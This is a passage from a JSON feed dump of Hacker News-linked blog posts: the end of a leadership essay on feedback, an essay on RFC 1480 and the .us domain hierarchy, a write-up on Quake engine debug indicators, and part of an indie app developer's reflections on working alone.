you’re not going to act on it, let them know that you at least heard it. Nobody wants to feel unheard.</p><p>In fact, you'll probably think — if you haven't done it already — that you should have an anonymous comment system to capture feedback. Don't. It's a trap. Anonymous feedback is the most contextless feedback you'll get, which makes it the least actionable. And it inevitably turns out to be contradictory or lacking key information, all those folks feel even more unheard and unhappy than before.</p><p>Finally, accept that you're going to get it wrong sometimes, and own that. You're going to ignore feedback that turns out to be important. You're going to overreact to feedback that turns out to be noise. When you make a misstep, be transparent about how you're correcting it.</p><p>Past a certain size, you have to make peace with the fact that a lot of people in your org are going to be frustrated with you, and you're going to have no idea why, and you may not going to be able to fix it.</p><p>Not because you're a bad leader. Not because you don't care. But because feedback doesn't scale, relationships don't scale, and the alternative—trying to maintain authentic personal connections with hundreds of people—is a recipe for burnout and failure.</p><p>This is genuinely hard to accept, especially if you came up through the early days when you did know everyone. That version of leadership was real, and it worked, and it probably felt really good. But it doesn't work anymore, and pretending it does just makes things worse.</p><p><em>Note: The photo is of a large crowd gathering for a union meeting during the 1933 New York Dressmakers Strike. That's scaling feedback.</em></p><small>\n        Published \n         in Writing\n      </small>","contentLength":8969,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://news.ycombinator.com/item?id=46058471"},{"title":"Memories of .us","url":"https://computer.rip/2025-11-11-dot-us.html","date":1764164179,"author":"sabas_ge","guid":137,"unread":true,"content":"<p>How much do you remember from elementary school? I remember vinyl tile floors,\nthe playground, the teacher sentencing me to standing in the hallway. I had a\nteacher who was a chess fanatic; he painted a huge chess board in the paved\nschoolyard and got someone to fabricate big wooden chess pieces. It was enough\nof an event to get us on the evening news. I remember Run for the Arts, where I\ntried to talk people into donating money on the theory that I could run, which\nI could not. I'm about six months into trying to change that and I'm good for a\nmediocre 5k now, but I don't think that's going to shift the balance on K-12\nart funding.</p><p>I also remember a domain name: bridger.pps.k12.or.us</p><p>I have quipped before that\ncomputer science is a field mostly concerned with assigning numbers to things,\nwhich is true, but it only takes us so far. Computer scientists also like to\norganize those numbers into structures, and one of their favorites has always\nbeen the tree. The development of wide-area computer networking surfaced a\nwhole set of problems around naming or addressing computer systems that belong\nto organizations. A wide-area network consists of a set of institutions that\nmanage their own affairs. Each of those institutions may be made up of\ndepartments that manage their own affairs. A tree seemed a natural fit. Even\nthe \"low level\" IP addresses, in the days of \"classful\" addressing, were\na straightforward hierarchy: each dot separated a different level of the tree,\na different step in an organizational hierarchy.</p><p>The first large computer networks, including those that would\nbecome the Internet, initially relied on manually building lists of machines by\nname. By the time the Domain Name System was developed, this had already become\ncumbersome. The rapid growth of the internet was hard to keep up with, and besides,\nwhy did any one central entity---Jon Postel or whoever---even care about the\nnames of all of the computers at Georgia Tech? Like IP addressing, DNS was designed\nas a hierarchy with delegated control. A registrant obtains a name in the hierarchy,\nsay gatech.edu, and everything \"under\" that name is within the control, and\nresponsibility, of the registrant. This arrangement is convenient for both the\nDNS administrator, which was a single organization even after the days of Postel,\nand for registrants.</p><p>We still use the same approach today... mostly. The meanings of levels of the\nhierarchy have ossified. Technically speaking, the top of the DNS tree, the DNS\nroot, is a null label referenced by a trailing dot. It's analogous to the '/'\nat the beginning of POSIX file paths. \"gatech.edu\" really should be written as\n\"gatech.edu.\" to make it absolute rather than relative, but since resolution of\nrelative URLs almost always recurses to the top of the tree, the trailing dot\nis \"optional\" enough that it is now almost always omitted. The analogy to POSIX\nfile paths raises an interesting point: domain names are backwards. The 'root'\nis at the end, rather than at the beginning, or in other words, they run from\nleast significant to most significant, rather than most significant to least\nsignificant. That's just... one of those things, you know? In the early days\none wasn't obviously better than the other, people wrote hierarchies out both\nways, and as the dust settled the left-to-right convention mostly prevailed\nbut right-to-left hung around in some protocols. If you've ever dealt with\nendianness, this is just one of those things about computers that you have to\naccept: we cannot agree on which way around to write things.</p><p>Anyway, the analogy to file paths also illustrates the way that DNS has ossified.\nThe highest \"real\" or non-root component of a domain name is called the top-level\ndomain or TLD, while the component below it is called a second-level domain. In\nthe US, it was long the case that top-level domains were fixed while second-level\ndomains were available for registration. There have always been exceptions in\nother countries and our modern proliferation of TLDs has changed this somewhat,\nbut it's still pretty much true. When you look at \"gatech.edu\" you know that\n\"edu\" is just a fixed name in the hierarchy, used to organize domain names by\norganization type, while \"gatech\" is a name that belongs to a registrant.</p><p>Under the second-level name, things get a little vague. We are all familiar with\nthe third-level name \"www,\" which emerged as a convention for web servers and\nbecame a practical requirement. Web servers having the name \"www\" under an\norganization's domain was such a norm for so many years that hosting a webpage\ndirectly at a second-level name came to be called a \"naked domain\" and had some\ncaveats and complications.</p><p>Other than www, though, there are few to no standards for the use of third-level\nand below names. Larger organizations are more likely to use third-level names\nfor departments, infrastructure operators often have complex hierarchies of\nnames for their equipment, and enterprises the world 'round name their load-balanced\nwebservers \"www2,\" \"www3\" and up. If you think about it, this situation seems like\nkind of a failure of the original concept of DNS... we do use the hierarchy, but\nfor the most part it is not intended for human consumption. Users are only\nexpected to remember two names, one of which is a TLD that comes from a relatively\nconstrained set.</p><p>The issue is more interesting when we consider geography. For a very long time, TLDs\nhave been split into two categories: global TLDs, or gTLDs, and country-code TLDs,\nor ccTLDs. ccTLDs reflect the ISO country codes of each country, and are intended for\nuse by those countries, while gTLDs are arbitrary and reflect the fact that DNS was\ndesigned in the US. The \".gov\" gTLD, for example, is for use by the US government,\nwhile the UK is stuck with \".gov.uk\". This does seem unfair but it's now very much\ncemented into the system: for the large part, US entities use gTLDs, while entities\nin other countries use names under their respective ccTLDs. The \".us\" ccTLD exists\njust as much as all the others, but is obscure enough that my choice to put my\npersonal website under .us (not an ideological decision but simply a result of where\na nice form of my name was available) sometimes gets my email address rejected.</p><p>Also, a common typo for \".us\" is \".su\" and that's geopolitically amusing. .su is of\ncourse the ccTLD for the Soviet Union, which no longer exists, but the ccTLD lives\non in a limited way because it became Structurally Important and difficult to remove, as names and addresses\ntend to do.</p><p>We can easily imagine a world where this historical injustice had been fixed: as\nthe internet became more global, all of our US institutions could have moved under\nthe .us ccTLD. In fact, why not go further? Geographers have long organized political\nboundaries into a hierarchy. The US is made up of states, each of which has been\nassigned a two-letter code by the federal government. We have \".us\", why not \"nm.us\"?</p><p>The answer, of course, is that we do.</p><p>In the modern DNS, all TLDs have been delegated to an organization who administers\nthem. The .us TLD is rightfully administered by the National Telecommunications and\nInformation Administration, on the same basis by which all ccTLDs are delegated to\ntheir respective national governments. Being the US government, NTIA has naturally\nprivatized the function through a contract to telecom-industrial-complex giant\nNeustar. Being a US company, Neustar restructured and sold its DNS-related business\nto GoDaddy. Being a US company, GoDaddy rose to prominence on the back of infamously\ntasteless television commercials, and its subsidiary Registry Services LLC now\noperates our nation's corner of the DNS.</p><p>But that's the present---around here, we avoid discussing the present so as to hold\ncrushing depression at bay. Let's turn our minds to June 1993, and the publication of\nRFC 1480 \"The US Domain.\" To wit:</p><blockquote><p>Even though the original intention was that any educational\ninstitution anywhere in the world could be registered under the EDU\ndomain, in practice, it has turned out with few exceptions, only\nthose in the United States have registered under EDU, similarly with\nCOM (for commercial). In other countries, everything is registered\nunder the 2-letter country code, often with some subdivision.  For\nexample, in Korea (KR) the second level names are AC for academic\ncommunity, CO for commercial, GO for government, and RE for research.\nHowever, each country may go its own way about organizing its domain,\nand many have.</p></blockquote><p>Oh, so let's sort it out!</p><blockquote><p>There are no current plans of putting all of the organizational\ndomains EDU, GOV, COM, etc., under US.  These name tokens are not\nused in the US Domain to avoid confusion.</p></blockquote><blockquote><p>Currently, only four year colleges and universities are being\nregistered in the EDU domain.  All other schools are being registered\nin the US Domain.</p></blockquote><p>RFC 1480 is a very interesting read. It makes passing references to so many\nfacets of DNS history that could easily be their own articles. It also\ndefines a strict, geography-based hierarchy for the .us domain that is a\ncompletely different universe from the one in which we now live. For example,\nwe learned above that, in 1993, only four-year institutions were being\nplaced under .edu. What about the community colleges? Well, RFC 1480 has an\nanswer. Central New Mexico Community College would, of course, fall under\ncnm.cc.nm.us. Well, actually, in 1993 it was called the Technical-Vocational\nInstitute, so it would have been tvi.tec.nm.us. That's right, the RFC\ndescribes both \"cc\" for community colleges and \"tec\" for technical institutes.</p><p>Even more surprising, it describes placing entities under a \"locality\" such as\na city. The examples of localities given are \"berkeley.ca.us\" and \"portland.wa.us\", the\nlatter of which betrays an ironic geographical confusion. It then specifies \"ci\"\nfor city and \"co\" for county, meaning that the city government of our notional\nPortland, Washington would be ci.portland.wa.us. Agencies could go under the\ncity government component (the RFC gives the example \"Fire-Dept.CI.Los-Angeles.CA.US\")\nwhile private businesses could be placed directly under the city (e.g. \"IBM.Amonk.NY.US\").\nThe examples here reinforce that the idea itself is different from how we use DNS\ntoday: The DNS of RFC 1480 is far more hierarchical and far more focused on full\nnames, without abbreviations.</p><p>Of course, the concept is not limited to local government. RFC 1480 describes\n\"fed.us\" as a suffix for the federal government (the example \"dod.fed.us\" illustrates\nthat this has not at all happened), and even \"General Independent Entities\" and\n\"Distributed National Institutes\" for those trickier cases.</p><p>We can draw a few lessons from how this proposal compares to our modern day.\nBack in the 1990s, .gov was limited to the federal government.\nThe thinking was that all government agencies would move into .us, where the\nhierarchical structure made it easier to delegate management of state and\nlocality subtrees. What actually happened was the opposite: the .us thing\nnever really caught on, and a more straightforward and automated management\nprocess made .gov available to state and local governments. The tree has\neffectively been flattened.</p><p>That's not to say that none of these hierarchical names saw use.\nGoDaddy continues to maintain what they call the \"usTLD Locality-Based\nStructure\". At the decision of the relevant level of the hierarchy (e.g.\na state), locality-based subdomains of .us can either be delegated to\nthe state or municipality to operate, or operated by GoDaddy itself as\nthe \"Delegated Manager.\" The latter arrangement is far more common, and\nit's going to stay that way: RFC 1480 names are not dead, but they are\non life support. GoDaddy's contract allows them to stop onboarding any\nadditional delegated managers, and they have.</p><p>Few of these locality-based names found wide use, and there are even\nfewer left today. Multnomah County Library once used \"multnomah.lib.or.us,\"\nwhich I believe was actually the very first \"library\" domain name registered.\nIt now silently redirects to \"multcolib.org\", which\nwe could consider a graceful name only in that the spelling of\n\"Multnomah\" is probably not intuitive to those not from the region. As\nfar as I can tell, the University of Oregon and OGI (part of OHSU)\nwere keeping very close tabs on the goings-on of academic DNS, as\nOregon entities are conspicuously over-represented in the very early\ndays of RFC 1480 names---behind only California, although Georgia\nTech and Trent Heim of former Colorado company XOR both registered enough names to give their\nstates a run for the money.</p><p>\"co.bergen.nj.us\" works, but just gets you a redirect notice page to\nbergencountynj.gov. It's interesting that this name is actually longer\nthan the RFC 1480 name, but I think most people would agree that bergencountynj.gov\nis easier to remember. Some of that just comes down to habit, we all know \".gov\",\nbut some of it is more fundamental. I don't think that people often\nunderstand the hierarchical structure of DNS, at least not intuitively, and\nthat makes \"deeply hierarchical\" (as GoDaddy calls them) names confusing.</p><p>Certainly the RFC 1480 names for school districts produced complaints.\nThey were also by far the most widely adopted. You can pick and choose\nexamples of libraries (.lib.[state].us) and municipal governments that have\nused RFC 1480 names, but school districts are another world: most school\ndistricts that existed at the time have a legacy of using RFC 1480 naming.\nAs one of its many interesting asides, RFC 1480 explains why: the practice\nof putting school districts under [district].k12.[state].us actually\npredates RFC 1480. Indeed, the RFC seems to have been written in part to\nformalize the existing practice. The idea of the k12.[state].us hierarchy\noriginated within IANA in consultation with InterNIC (newly created at\nthe time) and the Federal Networking Council, a now-defunct advisory\ncommittee of federal agencies that made a number of important early\ndecisions about internet architecture.</p><p>RFC 1480 is actually a revision on the slightly older RFC 1386, which\ninstead of saying that schools were already using the k12 domains, says that\n\"there ought to be a consistent scheme for naming them.\" It then says\nthat the k12 branch has been \"introduced\" for that purpose. RFC 1386 is\nmostly silent on topics  than schools, so I think it was written\nto document the decision made about schools with other details about\nthe use of locality-based domains left sketchy until the more thorough\nRFC 1480.</p><p>The decision to place \"k12\" under the state rather than under a municipality\nor county might seem odd, but the RFC gives a reason. It's not unusual for\nschool districts, even those named after a municipality, to cover a larger\narea than the municipality itself. Albuquerque Public Schools operates\nschools in the East Mountains; Portland Public Schools operates schools\nacross multiple counties and beyond city limits. Actually the RFC gives\nexactly that second one as an example:</p><blockquote><p>For example, the Portland school\ndistrict in Oregon, is in three or four counties.  Each of those\ncounties also has non-Portland districts.</p></blockquote><p>I include that quote mostly because I think it's funny that the authors\nnow know what state Portland is in. When you hear \"DNS\" you think Jon\nPostel, at least if you're me, but RFC 1480 was written by Postel along\nwith a less familiar name, Ann Westine Cooper. Cooper was a coworker of\nPostel at USC, and RFC 1480 very matter-of-factly names the duo of\nPostel and Cooper as the administrator of the .US TLD. That's interesting\nconsidering that almost five years later Postel would become involved in\na notable conflict with the federal government over control of DNS---one\nof the events that precipitated today's eccentric model of public-private\nDNS governance.</p><p>There are other corners of the RFC 1480 scheme that were not contemplated\nin 1993, and have managed to outlive many of the names that were. Consider,\nfor example, our indigenous nations: these are an exception to the normal\npolitical hierarchy of the US. The Navajo Nation, for example, exists in a\nstate that is often described as parallel to a state, but isn't really.\nNative nations are sovereign, but are also subject to federal law by\nstatute, and subject to state law by various combinations of statute,\njurisprudence, and bilateral agreement. I didn't really give any detail\nthere and I probably still got something wrong, such is the complicated\nlegal history and present of Native America. So where would a native\nsovereign government put their website? They don't fall under the\ntraditional realm of .gov, federal government, nor do they fall under a\nstate-based hierarchy. Well, naturally, the Navajo Nation is found at\nnavajo-nsn.gov.</p><p>We can follow the \"navajo\" part but the \"nsn\" is odd, unless they spelled\n\"nation\" wrong and then abbreviated it, which I've always thought is what\nit looks like on first glance. No, this domain name is very much an artifact\nof history. When the problem of sovereign nations came to Postel and Cooper,\nthe solution they adopted was a new affinity group, like \"fed\" and \"k12\"\nand \"lib\": \"nsn\", standing for Native Sovereign Nation. Despite being a\nlate comer, nsn.us probably has the most enduring use of any part of the\nRFC 1480 concept. Dozens of pueblos, tribes, bands, and confederations\nstill use it. squamishtribe.nsn.us, muckleshoot.nsn.us, ctsi.nsn.us,\nsandiapueblo.nsn.us.</p><p>Yet others have moved away... in a curiously \"partial\" fashion. navajo-nsn.gov\nas we have seen, but an even more interesting puzzler is tataviam-nsn.us. It's\nonly one character away from a \"standardized\" NSN affinity group locality domain,\nbut it's so far away. As best I can tell, most of these governments initially\nadopted \"nsn.us\" names, which cemented the use of \"nsn\" in a similar way to \"state\"\nor \"city\" as they appear in many .gov domains to this day. Policies on .gov\nregistration may be a factor as well, the policies around acceptable .gov names\nseem to have gone through a long period of informality and then changed a number\nof times. Without having researched it too deeply, I have seen bits and pieces\nthat make me think that at various points NTIA has preferred that .gov domains\nfor non-federal agencies have some kind of qualifier to indicate their \"level\"\nin the political hierarchy. In any case, it's a very interesting situation because\n\"native sovereign nation\" is not otherwise a common term in US government.\nIt's not like lawyers or lawmakers broadly refer to tribal governments as NSNs,\nthe term is pretty much unique to the domain names.</p><p>So what ever happened to locality-based names? RFC 1480 names have fallen\nout of favor to such an extent as to be considered legacy by many of their\nusers. Most Americans are probably not aware of this name hierarchy at all,\ndespite it ostensibly being the unified approach for this country. In\nshort, it failed to take off, and those sectors that had widely adopted it\n(such as schools) have since moved away. But why?</p><div><p>I put a lot of time into writing this, and I hope that you enjoy reading\nit. If you can spare a few dollars, consider <a href=\"https://ko-fi.com/jbcrawford\">supporting me on\nko-fi</a>. You'll receive an occasional extra,\nsubscribers-only post, and defray the costs of providing artisanal, hand-built\nworld wide web directly from Albuquerque, New Mexico.</p></div><p>As usual, there seem to be a few reasons. The first is user-friendliness.\nThis is, of course, a matter of opinion---but anecdotally, many people\nseem to find deeply hierarchical domain names confusing. This may be a\nself-fulfilling prophecy, since the perception that multi-part DNS names\nare user-hostile means that no one uses them which means that no users\nare familiar with them. Maybe, in a different world, we could have broken\nout of that loop. I'm not convinced, though. In RFC 1480, Postel and\nCooper argue that a deeper hierarchy is valuable because it allows for\nmore entities to have their \"obviously correct\" names. That does make\nsense to me, splitting the tree up into more branches means that there is\nless name contention within each branch. But, well, I think it might be\nthe kind of logic that is intuitive only those who work in computing.\nFor the general public, I think long multi-part names quickly become\ndifficult to remember and difficult to type. When you consider the dollar\namounts that private companies have put into dictionary word domain names,\nit's no surprise that government agencies tend to prefer one-level names\nwith full words and simple abbreviations.</p><p>I also think that the technology outpaced the need that RFC 1480 was\nintended to address. The RFC makes it very clear that Postel and Cooper\nwere concerned about the growing size of the internet, and expected the\nsheer number of organizations going online to make maintenance of the DNS\nimpractical. They correctly predicted the explosion of hosts, but not the\ncorresponding expansion of the DNS bureaucracy. Between the two versions\nof the .us RFC, DNS operations were contracted to Network Solutions. This\nbegan a winding path that lead to delegation of DNS zones to various\nprivate organizations, most of which fully automated registration and\ndelegation and then federated it via a common provisioning protocol. The\nsize of, say, the .com zone really did expand beyond what DNS's designers\nhad originally anticipated... but it pretty much worked out okay. The\nmechanics of DNS's maturation probably had a specifically negative effect\non adoption of .us, since it was often under a different operator from the\n\"major\" domain names and not all \"registrars\" initially had access.</p><p>Besides, the federal government never seems to have been all that on board\nwith the concept. RFC 1480 could be viewed as a casualty of the DNS wars,\na largely unexplored path on the branch of DNS futures that involved IANA\nbecoming completely independent of the federal government. That didn't\nhappen. Instead, in 2003 .gov registration was formally opened to municipal,\nstate, and tribal governments. It became federal policy to encourage use of\n.gov for trust reasons (DNSSEC has only furthered this), and .us began to fall by the wayside.</p><p>That's not to say that RFC 1480 names have ever gone away. You can still\nfind many of them in use. state.nm.us doesn't have an A record, but governor.state.nm.us\nand a bunch of other examples under it do. The internet is littered\nwith these locality-based names, many of them hiding out in smaller\nagencies and legacy systems. Names are hard to get right, and one of the reasons is\nthat they're very hard to get rid of.</p><blockquote><p>When things are bigger, names have to be longer.  There is an\nargument that with only 8-character names, and in each position allow\na-z, 0-9, and -, you get 37**8 = 3,512,479,453,921 or 3.5 trillion\npossible names.  It is a great argument, but how many of us want\nnames like \"xs4gp-7q\".  It is like license plate numbers, sure some\npeople get the name they want on a vanity plate, but a lot more\npeople who want something specific on a vanity plate can't get it\nbecause someone else got it first.  Structure and longer names also\nlet more people get their \"obviously right\" name.</p></blockquote><p>You look at Reddit these days and see all these usernames that are two\nrandom words and four random numbers, and you see that Postel and Cooper\nwere right. Flat namespaces create a problem, names must either be complex\nor long, and people don't like it either. What I think they got wrong, at\na usability level, is that deep hierarchies still create names that are\ncomplex  long. It's a kind of complexity that computer scientists\nare more comfortable with, but that's little reassurance when you're\nstaring down the barrel of \"bridger.pps.k12.or.us\".</p>","contentLength":23741,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://news.ycombinator.com/item?id=46057266"},{"title":"Quake Engine Indicators","url":"https://fabiensanglard.net/quake_indicators/index.html","date":1763971811,"author":"liquid_x","guid":136,"unread":true,"content":"<p>I was working on a <a href=\"https://github.com/Henrique194/chocolate-quake/issues/59\">bug</a> in Chocolate Quake netcode. The issue was an edge case where starting two clients on the same machine resulted in the second one zombifying the first one. When the bug occurred there was no disconnection but the client could no longer move. Instead the screen would show an \"indicator\" looking like an unplugged Ethernet cable  in the upper left corner.</p><a href=\"https://fabiensanglard.net/quake_indicators/quake_640.png\"><img loading=\"lazy\" src=\"https://fabiensanglard.net/quake_indicators/quake_640.png\" width=\"640\" height=\"480\"></a><p>As I dug into the code, I learned there were more of these. Located inside  and nested in  are files TURTLE, DISC, RAM, and NET. I could not find anything about these \"indicators\" so I documented them here.</p><a href=\"https://fabiensanglard.net/quake_indicators/TURTLE.png\"><img loading=\"lazy\" src=\"https://fabiensanglard.net/quake_indicators/TURTLE.png\" width=\"32\" height=\"32\"></a><p>The  indicator shows up on screen when the framerate goes below 10 fps. It is  unlikely to have been intended for players but rather for people at id Software during development. Programmers could see where the engine was not fast enough. More importantly map designers could see if they had too many polygons in specific areas of their map.</p><p>The  indicator can be enabled/disabled with command . The code is all in function <a href=\"https://github.com/id-Software/Quake/blob/bf4ac424ce754894ac8f1dae6a3981954bc9852d/WinQuake/screen.c#L362\">SCR_DrawTurtle</a>, where  is the time in seconds it took to draw the last frame.</p><p>There is a <a href=\"https://github.com/id-Software/Quake-2/blob/372afde46e7defc9dd2d719a1732b8ace1fa096e/client/cl_scrn.c#L412C30-L412C44\">scr_showturtle</a> in Quake 2 source code  but it does not do anything.</p><p>The icon doesn't actually depict a turtle but a tortoise. A turtle swims in the water while a tortoise walks on land. </p><a href=\"https://fabiensanglard.net/quake_indicators/RAM.png\"><img loading=\"lazy\" src=\"https://fabiensanglard.net/quake_indicators/RAM.png\" width=\"32\" height=\"32\"></a><p> Quake does not render polygons using directly a texture and a lightmap. Instead it combines these two into a \"surface\" which is then fed to the rasterizer. After being used surfaces are not discarded but cached because the next frame is likely to need the same surface again.</p><p>The  indicator is here to warn when the engine evicts from the cache surfaces that were generated and cached on the same frame. This means the geometry of the map forces the engine to operate beyond its surface cache capacity. Under this condition, the renderer enters a catastrophic \"death spiral\" where it evicts surfaces that will be needed later in the frame. Needless to say the framerate suffers greatly.</p><p>This was likely a feature intended for map designers to warn them of scenes going beyond the amount of surface cache memory Quake <a href=\"https://github.com/id-Software/Quake/blob/bf4ac424ce754894ac8f1dae6a3981954bc9852d/WinQuake/d_surf.c#L35\">provisioned</a>. See <a href=\"https://github.com/id-Software/Quake/blob/bf4ac424ce754894ac8f1dae6a3981954bc9852d/WinQuake/d_surf.c#L130\">D_SCAlloc</a> where thrashing is detected to learn more about it.</p><p>Alike the turtle one, this indicator can also be enabled/disabled with command .</p><a href=\"https://fabiensanglard.net/quake_indicators/DISC.png\"><img loading=\"lazy\" src=\"https://fabiensanglard.net/quake_indicators/DISC.png\" width=\"24\" height=\"24\"></a><p>The  indicator <a href=\"https://github.com/id-Software/Quake/blob/bf4ac424ce754894ac8f1dae6a3981954bc9852d/WinQuake/common.c#L1574\">wraps HDD access</a> done via . It is unlikely it was used by developers to diagnose anything since its screen location overlaps with the TURTLE indicator. It is just here to give feedback to players that the game is loading.</p><p>Because the icon is hidden when  returns, it is normal to see it flicker on the screen (and it also looks kinda cool). The code for this indicator is in <a href=\"https://github.com/id-Software/Quake/blob/bf4ac424ce754894ac8f1dae6a3981954bc9852d/WinQuake/draw.c#L882\">Draw_BeginDisc</a>.</p><a href=\"https://fabiensanglard.net/quake_indicators/NET.png\"><img loading=\"lazy\" src=\"https://fabiensanglard.net/quake_indicators/NET.png\" width=\"32\" height=\"32\"></a><p>The  indicator is displayed when a client has not received any packets from the server in the last 300ms. This was likely aimed at players to help them determine how bad their connection was (a distant server would easily have a 500ms ping in these dial-up over PPP modem days) or if they had plainly lost connection to the server.</p><p>The NET indicator is present and active in Quake 2. The code is still in <a href=\"https://github.com/id-Software/Quake-2/blob/372afde46e7defc9dd2d719a1732b8ace1fa096e/client/cl_scrn.c#L442\">SCR_DrawNet</a> but the image is no longer in a wad. It is stored in  at .</p><p>Below, a terrible user experience where the frame made the engine thrash its surface cache, the framerate dropped below 10fps, and the engine last received packets from the server more than 300ms ago.</p><a href=\"https://fabiensanglard.net/quake_indicators/quake_all_together.png\"><img loading=\"lazy\" src=\"https://fabiensanglard.net/quake_indicators/quake_all_together.png\" width=\"640\" height=\"480\"></a>","contentLength":3330,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://news.ycombinator.com/item?id=46031552"},{"title":"Indie, alone, and figuring it out","url":"https://danijelavrzan.com/posts/2025/11/indie-dev/","date":1763912002,"author":"wallflower","guid":135,"unread":true,"content":"<p>Going indie is exciting. Total freedom, no 9–5, no meetings - just building your own app. I imagined quiet mornings, deep focus, full control over my day. And some of that&nbsp;&nbsp;true. But once you’re actually doing it, you discover a whole other side of indie life.</p><p>The loneliness. The pressure. The constant decision-making. The endless context switching. All the invisible work that isn’t coding. These are the things you learn once you’re already in it.</p><p>It’s more chaotic and demanding than it looks, but also more rewarding in ways you don’t expect.</p><p>Being independent is a dream many have. To work on your own product, your own app, for yourself, on your own time. You’re no longer tied to a desk and a regular 9–5, and that sounds exciting.</p><p>After a couple of failed attempts to build and release my app while working a full-time job - I quit and went indie. I released my app <a href=\"https://danijelavrzan.com/posts/2025/06/meet-nunch/\">Nunch</a> this year.</p><p>I gained deep respect for anyone who’s able to build an app and have a full-time job at the same time. It’s hard. But, it does get a bit easier once you release the app.</p><p>In a company, you’re the developer, you focus on one area of the product. You work together with other developers, designers, product owners, and other people. As an indie, you’re the developer, designer, product owner, and everything else. You’re doing all the work.</p><p>As a product owner, you need to have a clear vision on the features and the roadmap. As a designer, you need to think about the UI and UX. And then you have to do all the work of developing new features, fixing bugs, and maintaining the code. It’s a lot of work for one person.</p><p>Some indie developers hire other developers as freelancers to help them out on a feature. They hire a designer to create app icons and other artwork. You don’t have to do everything yourself, you can outsource any work you’d like. But you will, for the most part.</p><p>Being independent is lonely, you have no colleagues to talk to, no one to ask questions, no one to bounce off ideas. But, you can find other indies and join different Slack or Discord chats - there are many.</p><p>Another option is to build in public and share what you’re doing on social media. Interact with other developers and it might feel less lonely.</p><p>You don’t have to go completely alone if you don’t want to. But it will never be the same as working in a company as part of a team. I know a few developers who don’t want to go indie - they love working in a team and don’t want to lose that culture.</p><p>Doing everything yourself means doing things you might have never done before. Or ever thought you would. Writing code, designing the user interface, and releasing an app - we can do, but that’s only one small part of the work.</p><p>If you want your app (or apps) to succeed and eventually become your full-time job, you have to do more than just release it.</p><p>As developers, we think, once we release our app, people will find it and use it. But that’s far from the truth. Once your app is out, you need to bring users to your app. That means figuring out the marketing. Creating promo materials, writing content, sharing on social media, reaching to influencers - there’s a lot you can do. You have to figure out what works for your app.</p><p>Then there’s analytics. You can rely on App Store Connect or add custom SDK to learn how users interact with your app. Again, this decision is yours.</p><p>Then there’s paywalls. Also ASO (App Store Optimization). And support - you need to reply to any bug reports or feature requests.</p><p>As an indie, your users become your team, your investors, your stakeholders - all at once. Your entire business depends on people choosing to use the thing you built. That means listening to them, even when it’s uncomfortable.</p><p>Some will send thoughtful feedback. Some will report bugs you didn’t know existed. Some will leave glowing reviews that make your whole week. And some will drop a one-star review because your app is not free.</p><p>It’s humbling. You don’t get a product owner shielding you, or a customer support team filtering things. Everything comes straight to you - the praise, the criticism, and the frustration. You need to decide what to act on, what to ignore, and what fits your vision for the app.</p><p>You owe your users a good experience. They’re the reason your app survives. You have to earn their trust, keep improving, and keep showing up. That relationship becomes a huge part of indie life.</p><p>As an indie, you’re trading hours between building new features, fixing bugs, supporting your users, marketing, and simply staying sane. The hardest part isn’t the work - it’s choosing what to work on. Time is the most precious resource your have.</p><p>Whether you’ll fix that pesky bug you’ve been trying to figure out for weeks or work on that exciting new feature. Or you have to work on marketing and paywall optimization. You have to learn to prioritize. There’s no right or wrong decision, but whatever you decide shapes your progress.</p><p>Freedom from the regular 9-5 is what developers usually seek when going indie, among other things. Choosing when to work, how to work, and what to work on is exciting.</p><p>You can choose to wake up later and work a couple hours from your local coffee shop. You can, pretty much, do anything.</p><p>I still choose to work 9-5 because my hubby works those hours and then we finish at the same time. But I can go to the gym in the early afternoon. It’s less crowded. Sometimes I take a break and play <a href=\"https://hollowknightsilksong.com/\">Silksong</a> or go outside and take a walk. Because I can and it gives me a nice mental break.</p><p>I’ve been in situations where I’m coding something 8 hours a day in full focus mode for a few days. A couple of days in and I find myself staring at Xcode having no idea what I’m working on anymore. In a company, you rarely spend your whole day doing focused work. You get interrupted with meetings and other things. You can’t work in full focus mode for a long time.</p><p>Now I take breaks to do some other work. I’ll check my analytics or read an article I bookmarked on marketing. I’ll see if I can optimize my paywall or brainstorm features.</p><p>Not every day is the same, but most days I’m still just writing code. You find your rhythm.</p><p>Vibe coding is a thing now and people are building apps faster than ever. Some without any prior programming experience. There are people who only use AI to build things and never write a single line of code themselves. There are those who use AI for some use cases. There are some who don’t use it at all.</p><p>Everything I’ve said above is still the truth, whether you use AI or not. But, AI can definitely help speed things up. I use AI for some things. It helped me fix a few bugs a couple of times and decode weird Xcode errors. It’s great for writing text and simplifying user-facing copy.</p><p>I look at it as a fellow junior colleague whom I can talk with and gives me different perspectives. There are days where it’s really bad and I waste my time. There are days where it’s helpful. It’s great for some tasks but I use it sparingly. It’s especially bad with new APIs.</p><p>I love writing code so I don’t want to give that part away.</p><p>Before I wrap up, I want to share a couple of resources that have helped me on this journey.</p><p><a href=\"https://tryastro.app\">Astro</a> from <a href=\"https://x.com/matteo_spada\">Matteo</a> is a great tool for App Store Optimization and figuring out your App Store keywords. Once you get a hang of things, it’s easy to use. He also wrote a <a href=\"https://tryastro.app/books/\">few short books</a> to help you learn more about keyword optimization and I think you should definitely read them. They are free!</p><p><a href=\"https://x.com/twostraws\">Paul</a> wrote a book called <a href=\"https://www.hackingwithswift.com/store/everything-but-the-code\">Everything But the Code</a>, which I highly recommend. It’s self explanatory, but he says <em>it’s designed to provide everything you need to go from Xcode to App Store – from coming up with killer ideas, to launch strategy, to breakout success.</em></p><p><a href=\"https://x.com/adamlyttleapps\">Adam</a> has an amazing <a href=\"https://www.youtube.com/@adamlyttleapps\">YouTube</a> channel where he shares his indie journey and how he works on his apps. It’s a treasure trove.</p><p>This is not an extensive list, but worthy mentions.</p><p>I know I mentioned multiple times you have to do everything yourself. It’s true. You kinda know this going in but you still get surprised with things you never thought about. And I haven’t even talked about the bureaucracy of running your own company and dealing with taxes.</p><p>Being indie sounds exciting but might not be for everyone.</p><p>It’s lonely and requires you to be a jack of all trades. You’re the developer and the designer. You’re the product owner and the marketing department. You’re everything. If you enjoy working in a team - it might not be for you.</p><p>It’s also uncertain. You depend on your app doing well, and you don’t know what tomorrow brings. You have to make sure you bring new users and keep current users happy. You constantly have to be on top of things.</p><p>I enjoy everything indie life brings. Building and releasing an app on your own, then figuring out marketing, paywalls, and ASO strategies. It’s exciting and you learn a lot. You make mistakes and you learn some more. It’s a journey.</p><p>Please feel free to reach out on <a href=\"https://twitter.com/dvrzan\">X (Twitter)</a> or <a 